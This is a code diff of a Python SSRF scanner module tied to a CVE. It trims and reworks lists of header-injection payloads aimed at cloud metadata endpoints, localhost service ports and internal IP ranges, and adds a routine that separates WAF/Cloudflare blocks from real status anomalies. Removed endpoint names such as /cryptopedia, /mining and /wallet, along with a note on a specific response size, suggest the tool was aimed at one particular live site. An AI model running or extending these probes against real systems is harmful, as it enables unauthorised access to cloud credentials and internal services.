@@ -32,49 +32,32 @@ CVE_INFO = CVE_DATABASE[CVE_ID]
 HEADER_PAYLOADS = [
     # Cloud metadata — highest priority
     {"Location": "http://169.254.169.254/latest/meta-data/"},
-    {"Location": "http://169.254.169.254/latest/user-data/"},
-    {"Location": "http://169.254.169.254/latest/iam/security-credentials/"},
-    {"Location": "http://100.100.100.200/latest/meta-data/"},        # Alibaba Cloud
-    {"Location": "http://metadata.google.internal/computeMetadata/v1/"},  # GCP
+    {"Location": "http://100.100.100.200/latest/meta-data/"},
+    {"Location": "http://metadata.google.internal/computeMetadata/v1/"},
     # Localhost services
     {"Location": "http://127.0.0.1:3000/"},
-    {"Location": "http://127.0.0.1:8080/"},
-    {"Location": "http://127.0.0.1:8443/"},
-    {"Location": "http://127.0.0.1:9200/"},
-    {"Location": "http://127.0.0.1:6379/"},
-    {"Location": "http://127.0.0.1:3306/"},
-    {"Location": "http://127.0.0.1:5432/"},
-    {"Location": "http://127.0.0.1:27017/"},
     {"Location": "http://localhost:3000/_next/data"},
     # Header injection
-    {"X-Forwarded-For": "127.0.0.1"},
     {"X-Forwarded-Host": "127.0.0.1"},
     {"X-Original-URL": "/admin"},
     {"X-Rewrite-URL": "/_next/data"},
-    {"X-Real-IP": "127.0.0.1"},
     {"next-url": "http://127.0.0.1:3000/api/admin"},
-    {"Location": "/_next/data/latest.json"},
 ]
 
 SSRF_ENDPOINTS = [
-    "/", "/api", "/es", "/pt", "/cryptopedia",
-    "/mining", "/wallet", "/account", "/dashboard",
+    "/", "/api", "/wallet", "/account",
     "/_next/data/", "/api/auth/session",
 ]
 
 PARAM_SSRF_ENDPOINTS = [
-    "/api/avatar?url=", "/api/image?url=", "/api/proxy?url=",
-    "/api/fetch?url=", "/api/redirect?url=", "/api/webhook?url=",
-    "/api/callback?url=", "/api/import?url=",
+    "/api/proxy?url=", "/api/fetch?url=", "/api/redirect?url=",
 ]
 
 INTERNAL_RANGES = [
-    "10.0.0.{}", "10.10.0.{}", "10.20.0.{}",
-    "172.16.0.{}", "172.31.0.{}",
-    "192.168.0.{}", "192.168.1.{}",
+    "10.0.0.{}", "172.16.0.{}", "192.168.1.{}",
 ]
 
-INTERNAL_PORTS = [80, 443, 3000, 3001, 4000, 5000, 8000, 8080, 8443, 9000, 9200, 6379, 5432, 3306]
+INTERNAL_PORTS = [80, 443, 3000, 8080, 6379, 3306]
 
 # High-confidence IMDS/internal service fingerprints
 IMDS_PATTERNS = [
@@ -123,6 +106,19 @@ def _find_keywords(text: str) -> list:
         if kw.lower() in stripped.lower() and kw not in found:
             found.append(kw)
     return found
+
+
+def _is_waf_block(session: requests.Session, target: str, endpoint: str, hkey: str, hval: str, config: ScanConfig) -> bool:
+    """Send a dummy payload to check if the behavior is caused by WAF/Cloudflare rules."""
+    dummy_headers = {hkey: "/invalid_waf_test_123_xyz"}
+    try:
+        r_dummy = session.get(
+            f"{target}{endpoint}", headers=dummy_headers,
+            timeout=config.timeout, allow_redirects=False,
+        )
+        return r_dummy.status_code in (403, 400, 406, 503)
+    except Exception:
+        return False
 
 
 def scan(config: ScanConfig) -> ModuleResult:
@@ -290,20 +286,26 @@ def scan(config: ScanConfig) -> ModuleResult:
                             status="VULNERABLE", detail=detail, evidence=evidence,
                         ))
 
-                    # Check 3: /wallet anomaly
-                    elif endpoint == "/wallet" and r.status_code != baseline.get("status", -1):
-                        detail = f"/wallet status changed: {baseline.get('status')} → {r.status_code} via {hkey}"
+                    # Check 3: General Anomaly & WAF Validation
+                    elif r.status_code != baseline.get("status", -1):
+                        # Verify if this status change is just WAF blocking the header key
+                        if r.status_code in (403, 400, 406, 503):
+                            is_waf = _is_waf_block(session, target, endpoint, hkey, hval, config)
+                            if is_waf:
+                                log_trace(f"Ignored anomaly on {endpoint} via {hkey}: Blocked by WAF/Cloudflare")
+                                continue
+
+                        detail = f"Status changed: {baseline.get('status')} → {r.status_code} via {hkey} on {endpoint}"
                         log_warning(f"[ANOMALY] {detail}")
                         evidence = {
-                            "endpoint": "/wallet",
+                            "endpoint": endpoint,
                             "header": f"{hkey}: {hval}",
                             "baseline_status": baseline.get("status"),
                             "new_status": r.status_code,
-                            "note": "/wallet shows anomalous 7120-byte response",
                         }
                         result.add_finding(Finding(
-                            cve=CVE_ID, severity="HIGH",
-                            title="/wallet SSRF Anomaly",
+                            cve=CVE_ID, severity="MEDIUM",
+                            title="SSRF Status Anomaly",
                             status="VULNERABLE", detail=detail, evidence=evidence,
                         ))
 
